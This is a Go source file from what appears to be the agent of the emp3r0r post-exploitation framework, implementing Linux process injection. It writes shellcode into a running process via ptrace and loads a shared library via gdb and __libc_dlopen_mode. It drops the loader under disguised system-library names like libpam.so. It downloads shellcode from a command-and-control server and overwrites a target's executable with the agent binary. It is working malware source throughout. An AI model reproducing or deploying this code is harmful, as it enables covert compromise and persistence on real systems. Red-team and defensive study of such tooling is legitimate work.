//go:build linux
// +build linux

package agent

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/file"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	golpe "github.com/jm33-m0/go-lpe"
)

// inject a shared library using dlopen
func gdbInjectSOWorker(path_to_so string, pid int) error {
	gdb_path := RuntimeConfig.UtilsPath + "/gdb"
	if !util.IsFileExist(gdb_path) {
		res := VaccineHandler()
		if !strings.Contains(res, "success") {
			return fmt.Errorf("Download gdb via VaccineHandler: %s", res)
		}
	}

	temp := "/tmp/emp3r0r"
	if util.IsFileExist(temp) {
		os.RemoveAll(temp) // ioutil.WriteFile returns "permission denied" when target file exists, can you believe that???
	}
	err := CopySelfTo(temp)
	if err != nil {
		return err
	}
	// cleanup
	defer func() {
		time.Sleep(3 * time.Second)
		err = os.Remove("/tmp/emp3r0r")
		if err != nil {
			log.Printf("Delete /tmp/emp3r0r: %v", err)
		}
	}()

	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}

	gdb_cmd := fmt.Sprintf(`echo 'print __libc_dlopen_mode("%s", 2)' | %s -p %d`,
		path_to_so,
		gdb_path,
		pid)
	out, err := exec.Command(RuntimeConfig.UtilsPath+"/bash", "-c", gdb_cmd).CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s: %s\n%v", gdb_cmd, out, err)
	}

	return nil
}

// ShellcodeInjector inject shellcode to arbitrary running process
// target process will be restored after shellcode has done its job
func ShellcodeInjector(shellcode *string, pid int) error {
	// format
	*shellcode = strings.Replace(*shellcode, ",", "", -1)
	*shellcode = strings.Replace(*shellcode, "0x", "", -1)
	*shellcode = strings.Replace(*shellcode, "\\x", "", -1)

	// decode hex shellcode string
	sc, err := hex.DecodeString(*shellcode)
	if err != nil {
		return fmt.Errorf("Decode shellcode: %v", err)
	}

	// inject to an existing process or start a new one
	// check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
	if pid == 0 {
		// start a child process to inject shellcode into
		sec := strconv.Itoa(util.RandInt(10, 30))
		child := exec.Command("sleep", sec)
		child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
		err = child.Start()
		if err != nil {
			return fmt.Errorf("Start `sleep %s`: %v", sec, err)
		}
		pid = child.Process.Pid

		// attach
		err = child.Wait() // TRAP the child
		if err != nil {
			log.Printf("child process wait: %v", err)
		}
		log.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
	} else {
		// attach to an existing process
		proc, err := os.FindProcess(pid)
		if err != nil {
			return fmt.Errorf("%d does not exist: %v", pid, err)
		}
		pid = proc.Pid

		// https://github.com/golang/go/issues/43685
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		err = syscall.PtraceAttach(pid)
		if err != nil {
			return fmt.Errorf("ptrace attach: %v", err)
		}
		_, err = proc.Wait()
		if err != nil {
			return fmt.Errorf("Wait %d: %v", pid, err)
		}
		log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
	}

	// read RIP
	origRegs := &syscall.PtraceRegs{}
	err = syscall.PtraceGetRegs(pid, origRegs)
	if err != nil {
		return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
	}
	origRip := origRegs.Rip
	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)

	// save current code for restoring later
	origCode := make([]byte, len(sc))
	n, err := syscall.PtracePeekText(pid, uintptr(origRip), origCode)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", origRip)
	}
	log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)

	// write shellcode to .text section, where RIP is pointing at
	data := sc
	n, err = syscall.PtracePokeText(pid, uintptr(origRip), data)
	if err != nil {
		return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
	}
	log.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)

	// peek: see if shellcode has got injected
	peekWord := make([]byte, len(data))
	n, err = syscall.PtracePeekText(pid, uintptr(origRip), peekWord)
	if err != nil {
		return fmt.Errorf("PEEK: 0x%x", origRip)
	}
	log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)

	// continue and wait
	err = syscall.PtraceCont(pid, 0)
	if err != nil {
		return fmt.Errorf("Continue: %v", err)
	}
	var ws syscall.WaitStatus
	_, err = syscall.Wait4(pid, &ws, 0, nil)
	if err != nil {
		return fmt.Errorf("continue: wait4: %v", err)
	}

	// what happened to our child?
	switch {
	case ws.Continued():
		return nil
	case ws.CoreDump():
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: core dumped: RIP at 0x%x", origRegs.Rip)
	case ws.Exited():
		return nil
	case ws.Signaled():
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), origRegs.Rip)
	case ws.Stopped():
		stoppedRegs := &syscall.PtraceRegs{}
		err = syscall.PtraceGetRegs(pid, stoppedRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)

		// what's after RIP when stopped
		peek_stop := make([]byte, 32)
		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rip), peek_stop)
		if err != nil {
			return fmt.Errorf("PEEK: 0x%x", stoppedRegs.Rip)
		}
		log.Printf("Peeked %d bytes from RIP: %x at RIP (0x%x)", n, peekWord, stoppedRegs.Rip)

		peek_stack := make([]byte, 128)
		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsp), peek_stack)
		if err != nil {
			log.Printf("PEEK stack: 0x%x", stoppedRegs.Rsp)
		}
		// also the regs
		peek_rdi := make([]byte, 64)
		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rdi), peek_rdi)
		if err != nil {
			log.Printf("PEEK RDI: 0x%x", stoppedRegs.Rdi)
		}
		peek_rsi := make([]byte, 64)
		n, err = syscall.PtracePeekText(pid, uintptr(stoppedRegs.Rsi), peek_rsi)
		if err != nil {
			log.Printf("PEEK RSI: 0x%x", stoppedRegs.Rsi)
		}
		log.Printf("At (0x%x), RAX = 0x%x RDI = 0x%x -> 0x%x (%s), RSI = 0x%x -> 0x%x (%s)\n"+
			"Stack (0x%x) = 0x%x (%s)",
			stoppedRegs.Rip,
			stoppedRegs.Rax,
			stoppedRegs.Rdi, peek_rdi, peek_rdi,
			stoppedRegs.Rsi, peek_rsi, peek_rsi,
			stoppedRegs.Rsp, peek_stack, peek_stack)

		// restore registers
		err = syscall.PtraceSetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("Restoring process: set regs: %v", err)
		}

		// breakpoint hit, restore the process
		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
		if err != nil {
			return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
		}
		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)

		// let it run
		err = syscall.PtraceDetach(pid)
		if err != nil {
			return fmt.Errorf("Continue detach: %v", err)
		}
		log.Printf("%d will continue to run", pid)

		return nil
	default:
		err = syscall.PtraceGetRegs(pid, origRegs)
		if err != nil {
			return fmt.Errorf("read regs from %d: %v", pid, err)
		}
		log.Printf("continue: RIP at 0x%x", origRegs.Rip)
	}

	return nil
}

func injectSOWorker(so_path string, pid int) (err error) {
	dlopen_addr := GetSymFromLibc(pid, "__libc_dlopen_mode")
	if dlopen_addr == 0 {
		return fmt.Errorf("failed to get __libc_dlopen_mode address")
	}
	shellcode := gen_dlopen_shellcode(so_path, dlopen_addr)
	if len(shellcode) == 0 {
		return fmt.Errorf("failed to generate dlopen shellcode")
	}
	return ShellcodeInjector(&shellcode, pid)
}

// InjectSO inject loader.so into any process, using shellcode
// locate __libc_dlopen_mode in memory then use it to load SO
func InjectSO(pid int) error {
	so_path, err := prepare_injectSO(pid)
	if err != nil {
		return err
	}
	defer os.RemoveAll("/tmp/emp3r0r") // in case we have this file remaining on disk
	return injectSOWorker(so_path, pid)
}

// Inject loader.so into any process
func GDBInjectSO(pid int) error {
	so_path, err := prepare_injectSO(pid)
	if err != nil {
		return err
	}
	return gdbInjectSOWorker(so_path, pid)
}

func prepare_injectSO(pid int) (so_path string, err error) {
	so_path = fmt.Sprintf("%s/libtinfo.so.2.1.%d", RuntimeConfig.UtilsPath, util.RandInt(0, 30))
	if os.Geteuid() == 0 {
		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
		so_path = root_so_path
	}
	if !util.IsFileExist(so_path) {
		out, err := golpe.ExtractFileFromString(file.LoaderSO_Data)
		if err != nil {
			return "", fmt.Errorf("Extract loader.so failed: %v", err)
		}
		err = ioutil.WriteFile(so_path, out, 0644)
		if err != nil {
			return "", fmt.Errorf("Write loader.so failed: %v", err)
		}
	}
	return
}

// prepare for guardian_shellcode injection, targeting pid
func prepare_guardian_sc(pid int) (shellcode string, err error) {
	// prepare guardian_shellcode
	proc_exe := util.ProcExe(pid)
	// backup original binary
	err = CopyProcExeTo(pid, RuntimeConfig.AgentRoot+"/"+util.FileBaseName(proc_exe))
	if err != nil {
		return "", fmt.Errorf("failed to backup %s: %v", proc_exe, err)
	}
	err = CopySelfTo(proc_exe)
	if err != nil {
		return "", fmt.Errorf("failed to overwrite %s with emp3r0r: %v", proc_exe, err)
	}
	sc := gen_guardian_shellcode(proc_exe)

	return sc, nil
}

// InjectorHandler handles `injector` module
func InjectorHandler(pid int, method string) (err error) {
	// prepare the shellcode
	prepare_sc := func() (shellcode string, shellcodeLen int) {
		sc, err := DownloadViaCC("shellcode.txt", "")

		if err != nil {
			log.Printf("Failed to download shellcode.txt from CC: %v", err)
			// prepare guardian_shellcode
			emp3r0r_data.GuardianShellcode, err = prepare_guardian_sc(pid)
			if err != nil {
				log.Printf("Failed to prepare_guardian_sc: %v", err)
				return
			}
			sc = []byte(emp3r0r_data.GuardianShellcode)
		}
		shellcode = string(sc)
		shellcodeLen = strings.Count(string(shellcode), "0x")
		log.Printf("Collected %d bytes of shellcode, preparing to inject", shellcodeLen)
		return
	}

	// dispatch
	switch method {
	case "gdb_loader":
		err = CopySelfTo("/tmp/emp3r0r")
		if err != nil {
			return
		}
		err = GDBInjectSO(pid)
		if err == nil {
			err = os.RemoveAll("/tmp/emp3r0r")
			if err != nil {
				return
			}
		}
	case "inject_shellcode":
		shellcode, _ := prepare_sc()
		err = ShellcodeInjector(&shellcode, pid)
		if err != nil {
			return
		}

		// restore original binary
		err = CopyProcExeTo(pid, util.ProcExe(pid)) // as long as the process is still running
	case "inject_loader":
		err = CopySelfTo("/tmp/emp3r0r")
		if err != nil {
			return
		}
		err = InjectSO(pid)
		if err == nil {
			err = os.RemoveAll("/tmp/emp3r0r")
		}
	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}
